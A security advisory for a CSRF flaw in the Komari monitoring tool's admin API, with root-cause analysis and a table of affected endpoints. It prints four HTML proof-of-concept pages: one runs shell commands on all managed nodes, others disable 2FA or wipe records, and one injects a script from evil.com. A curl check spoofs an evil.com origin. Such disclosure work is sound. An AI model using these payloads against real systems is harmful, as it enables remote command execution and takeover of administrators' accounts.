# [H] Komari: Management Interface CSRF

## Summary
Severity: High
Advisory: GHSA-hxjg-93wc-h8p8
Ecosystem: Go
Published: 2026-09-09
Source: https://osv.dev/vulnerability/GHSA-hxjg-93wc-h8p8
Type: osv

## Affected
- Go: `github.com/komari-monitor/komari` — affected >=0 <0.0.0-20260609084633-98122fa4d110

## Details
# Vulnerability Overview

The `session_token` cookie is set **without** the `SameSite` or `Secure` attributes (`login.go:68`).

All `/api/admin/` management endpoints rely solely on this cookie for authentication, with **no CSRF token or Origin validation**.

**The server-side vulnerability is confirmed to exist; however, exploitation via cross-site requests is mitigated in modern browsers by the default `SameSite=Lax` behavior.**

## Root Cause

```go
// komari-main/api/public/login.go:68
c.SetCookie("session_token", session, 2592000, "/", "", false, true)
//   Secure=false, SameSite not explicitly set
//   Admin route group (server.go:213-343) has no CSRF middleware
```

Gin's `ShouldBindJSON` does not strictly validate the `Content-Type` header, allowing `text/plain` requests to bypass CORS preflight.

## Browser Limitations

- Chrome 80+ (Feb 2020), Firefox 103+ (Jul 2022), and Safari all default unspecified cookies to `SameSite=Lax`.
- Cookies without an explicit `SameSite` attribute **are not included in cross-site POST requests**.
- As a result, the server receives requests without the session cookie and returns **HTTP 401 Unauthorized**.

| Scenario | Exploitable |
|----------|-------------|
| Cross-site HTML (modern browsers) | ✗ Blocked by `SameSite=Lax` |
| Cross-site HTML (Chrome <80 / legacy browsers) | ✓ |
| Same-origin context (Browser Console / existing XSS) | ✓ |
| Man-in-the-middle over HTTP (`Secure=false`) | ✓ |

## High-Impact Operations Reachable via CSRF

| Endpoint | Method | Impact |
|----------|--------|--------|
| `/api/admin/task/exec` | POST | Execute arbitrary shell commands on managed nodes |
| `/api/admin/2fa/disable` | POST | Disable administrator two-factor authentication |
| `/api/admin/settings/` | POST | Modify system configuration |
| `/api/admin/upload/backup` | POST | Upload a malicious backup |
| `/api/admin/record/clear/all` | POST | Delete all monitoring records |
| `/api/admin/client/:uuid/edit` | POST | Modify client configuration |
| `/api/admin/client/:uuid/remove` | POST | Remove managed clients |
| `/api/admin/session/remove/all` | POST | Invalidate all active sessions |
| `/api/admin/settings/cloudflared/start` | POST | Start a Cloudflared tunnel |

## PoC 1 — Disable 2FA

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<iframe name="sink" style="display:none"></iframe>
<form id="f" method="POST"
      action="https://komari.example.com/api/admin/2fa/disable"
      target="sink"></form>
<script>
  document.getElementById('f').submit();
</script>
</body>
</html>
```

## PoC 2 — Remote Command Execution

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
var KOMARI = "https://komari.example.com";
var CMD    = "id && hostname && whoami";

fetch(KOMARI + "/api/admin/client/list", { credentials: "include" })
  .then(function(r){ return r.json(); })
  .then(function(data){
    var nodes = data.data || [];
    var uuids = [];
    for (var i = 0; i < nodes.length; i++) {
      if (nodes[i].uuid) uuids.push(nodes[i].uuid);
    }
    if (uuids.length === 0) return;
    return fetch(KOMARI + "/api/admin/task/exec", {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ command: CMD, clients: uuids })
    });
  });
</script>
</body>
</html>
```

## PoC 3 — Modify System Configuration

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
var KOMARI = "https://komari.example.com";
fetch(KOMARI + "/api/admin/settings/", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    "site_name": "Pwned",
    "custom_head": "<script src='https://evil.com/hook.js'><\/script>"
  })
});
</script>
</body>
</html>
```

## PoC 4 — Clear All Monitoring Records

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<iframe name="sink" style="display:none"></iframe>
<form id="f" method="POST"
      action="https://komari.example.com/api/admin/record/clear/all"
      target="sink"></form>
<script>
document.getElementById('f').submit();
</script>
</body>
</html>
```

## Verification Script

```bash
#!/bin/bash
KOMARI="${1:-https://komari.example.com}"

echo "=== CSRF Verification ==="

echo "[1] Cookie Attributes..."
curl -s -D - -o /dev/null \
  -X POST "$KOMARI/api/public/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}' | grep -i 'set-cookie'

echo ""
echo "[2] CORS Headers..."
curl -s -D - -o /dev/null \
  -H "Origin: https://evil.com" \
  "$KOMARI/api/public/config" | grep -i 'access-control'

echo ""
echo "[3] CSRF Protection on Admin Endpoint..."
CODE=$(curl -s -o /dev/null -w "%{http_code}" \
  -X POST "$KOMARI/api/admin/settings/" \
  -H "Content-Type: application/json" \
  -H "Origin: https://evil.com" \
  -d '{}')

echo "    HTTP ${CODE} — A 401 response indicates that only session authentication is enforced and no CSRF protection is present."
```

## References
- https://github.com/komari-monitor/komari/security/advisories/GHSA-hxjg-93wc-h8p8
- https://github.com/komari-monitor/komari
- https://github.com/komari-monitor/komari/releases/tag/1.2.2
